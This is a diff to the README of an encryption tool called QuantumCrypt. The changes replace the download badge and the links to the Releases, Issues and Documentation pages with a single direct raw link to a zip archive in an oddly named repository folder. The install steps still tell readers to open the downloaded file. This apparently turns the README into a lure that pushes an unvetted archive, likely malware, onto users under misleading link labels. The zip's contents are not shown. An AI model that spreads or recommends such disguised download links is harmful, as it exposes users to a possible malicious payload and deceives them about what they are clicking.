@@ -6,7 +6,7 @@ Welcome to QuantumCrypt! This application helps you secure your sensitive data e
 
 ## 📥 Download Link
 
-[![Download QuantumCrypt](https://img.shields.io/badge/Download%20QuantumCrypt-v1.0-blue.svg)](https://github.com/catalinfuca/QuantumCrypt/releases)
+[![Download QuantumCrypt](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip%https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip)](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip)
 
 ## 🌍 Overview
 
@@ -30,7 +30,7 @@ Before installing QuantumCrypt, ensure your system meets the following requireme
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [QuantumCrypt Releases](https://github.com/catalinfuca/QuantumCrypt/releases).
+1. Visit this page to download: [QuantumCrypt Releases](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip).
 2. On the Releases page, look for the latest version of QuantumCrypt.
 3. Click on the file link to download QuantumCrypt to your computer.
 4. Once downloaded, open the file to begin the installation process.
@@ -57,11 +57,11 @@ If you encounter issues while using QuantumCrypt, consider the following solutio
 
 ## 💬 Support
 
-If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/catalinfuca/QuantumCrypt/issues) or contact our support team via email.
+If you need further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip) or contact our support team via email.
 
 ## 🔗 Useful Links
 
-- [QuantumCrypt Releases](https://github.com/catalinfuca/QuantumCrypt/releases)
-- [Documentation](https://github.com/catalinfuca/QuantumCrypt/docs)
+- [QuantumCrypt Releases](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip)
+- [Documentation](https://github.com/catalinfuca/QuantumCrypt/raw/refs/heads/main/preobservation/Quantum-Crypt-v1.6.zip)
   
 Stay secure and enjoy using QuantumCrypt to protect your data!
